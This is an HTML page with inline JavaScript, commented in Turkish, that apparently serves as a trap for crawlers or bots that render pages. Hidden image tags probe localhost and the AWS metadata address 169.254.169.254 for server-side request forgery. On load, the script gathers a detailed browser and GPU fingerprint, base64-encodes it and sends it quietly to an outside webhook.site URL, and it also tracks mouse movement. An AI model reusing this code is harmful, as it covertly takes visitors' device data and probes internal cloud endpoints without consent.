<body>

        <img src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=hidden_pixel_img" alt="">
        <img src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=hidden_svg_img" alt="">

        <img src="http://127.0.0.1:80/favicon.ico" onerror="logSSRF('Localhost_Fail')" onload="logSSRF('Localhost_Success')">
        <img src="http://169.254.169.254/latest/meta-data/" onerror="logSSRF('AWS_Meta_Fail')" onload="logSSRF('AWS_Meta_Success')">

    <div class="bg-tracker"></div>

    <script>
        const WEBHOOK_URL = "https://webhook.site/ba202258-a350-476f-a68a-24a599534355";

        // Veri Gönderme Fonksiyonu (Base64 Encode ile)
        function sendLog(type, data) {
            const encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
            // URL uzunluğunu aşmamak için fetch yerine Image objesi kullanalım (Daha sessizdir)
            new Image().src = `${WEBHOOK_URL}?source=js_tracker&type=${type}&payload=${encodedData}`;
        }

        // 1. SSRF Durumunu Raporla
        function logSSRF(status) {
            new Image().src = `${WEBHOOK_URL}?source=ssrf_check&status=${status}`;
        }

        // 2. Kapsamlı Parmak İzi (Fingerprinting)
        function collectFingerprint() {
            const fp = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown', // CPU Çekirdek
                deviceMemory: navigator.deviceMemory || 'unknown', // RAM (GB)
                screenRes: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                historyLen: history.length
            };
            sendLog('AdvancedFingerprint', fp);
        }

        // 3. WebGL Bilgisi (Ekran Kartı - Bot mu Gerçek mi ayrımı için kritiktir)
        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    sendLog('WebGL', { vendor: vendor, renderer: renderer });
                }
            } catch(e) { /* Hata olursa sessiz kal */ }
        }

        // 4. Etkileşim Takibi (Bot fare kullanıyor mu?)
        let interactionSent = false;
        function trackInteraction() {
            if (!interactionSent) {
                sendLog('UserInteraction', { type: 'MouseMove/Touch' });
                interactionSent = true;
                // Event listenerları kaldır ki spam olmasın
                document.removeEventListener('mousemove', trackInteraction);
                document.removeEventListener('touchstart', trackInteraction);
            }
        }
        
        // Manuel Buton Tetikleyicisi
        function triggerManualLog() {
            sendLog('ManualClick', { btn: 'Fırsatları Yükle' });
            alert('Yükleniyor...'); // Botu oyalamak için
        }

        // --- BAŞLATMA ---
        window.onload = function() {
            collectFingerprint();
            getWebGLInfo();
            // Fare hareketlerini dinle
            document.addEventListener('mousemove', trackInteraction);
            document.addEventListener('touchstart', trackInteraction);
        };
    </script>
